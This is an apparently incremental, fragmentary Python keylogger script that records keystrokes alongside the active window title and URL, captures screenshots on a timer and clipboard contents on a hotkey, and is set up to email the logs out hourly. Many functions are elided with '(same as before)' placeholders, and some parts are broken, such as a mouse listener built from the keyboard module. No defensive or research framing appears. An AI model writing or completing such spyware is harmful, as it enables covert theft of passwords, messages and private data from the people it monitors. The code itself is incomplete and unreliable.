import platform
from pynput import keyboard
import time
import threading
import subprocess
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import win32clipboard
import re
import requests
import psutil
import pyudev
from urllib.parse import urlparse

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour
screenshot_interval = 600  # Capture screenshot every 10 minutes

current_word = ""
current_line = ""
current_application = ""
screenshot_key = keyboard.Key.print_screen
clipboard_key = keyboard.Key.f9

# Email configuration
# ... (same as before)

# Function to capture clipboard
# ... (same as before)

# Function to capture screenshot
# ... (same as before)

# Function to send email
# ... (same as before)

# Function to get active application
def get_active_application():
    if platform.system() == 'Linux':
        try:
            with open('/proc/' + str(psutil.Process().pid) + '/comm', 'r') as f:
                return f.read().strip()
        except:
            return ""
    elif platform.system() == 'Windows':
        try:
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return ""
    return ""

# Function to get active window's URL
# ... (same as before)

def on_click(x, y, button, pressed):
    # ... (same as before)

def on_key_press(key):
    global current_word, current_line, current_application

    # ... (same as before)

    current_application = get_active_application()
    current_url = get_active_url()

    if key == clipboard_key:
        capture_clipboard()

    if len(current_line) >= 50:
        save_current_line()

    if current_url:
        with open(log_file, 'a') as f:
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - [URL: {current_url}] - {current_line}\n')
        current_line = ""

# Set up mouse listener
mouse_listener = keyboard.Listener(on_click=on_click)
mouse_listener.start()

# Set up window listener
window_listener = threading.Thread(target=capture_window_title)
window_listener.start()

# Rest of the code remains unchanged
